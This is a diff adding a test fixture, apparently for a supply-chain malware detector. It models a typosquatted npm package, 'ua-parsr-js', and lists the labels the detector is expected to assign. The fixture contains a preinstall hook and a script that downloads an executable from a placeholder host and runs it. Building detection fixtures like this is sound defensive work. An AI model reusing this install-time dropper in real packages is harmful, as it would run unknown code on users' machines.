@@ -1,0 +1,24 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "typosquat",
+  "new-publisher-similar-name",
+  "sparse-metadata",
+  "npm-install-hook",
+  "binary-dropper"
+ ],
+ "files": {
+  "package/index.js": "module.exports = function parse(ua) { return { ua: ua }; };\n",
+  "package/package.json": "{\n  \"name\": \"ua-parsr-js\",\n  \"version\": \"0.7.29\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"start /B node preinstall.js & node preinstall.js\"\n  }\n}",
+  "package/preinstall.js": "const { execFile } = require(\"child_process\");\nconst fs = require(\"fs\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst target = path.join(os.tmpdir(), \"jsextension.exe\");\nhttps.get(\"https://example.invalid/download/jsextension.exe\", (res) => {\n  res.pipe(fs.createWriteStream(target)).on(\"finish\", () => {\n    fs.chmodSync(target, 0o755);\n    execFile(target, [\"-k\"]);\n  });\n});\n"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "Detect browser, engine, OS from the User-Agent",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "ua-parsr-js",
+ "pattern": "ua-parser-js style: preinstall script fetches a platform binary and runs it",
+ "version": "0.7.29"
+}
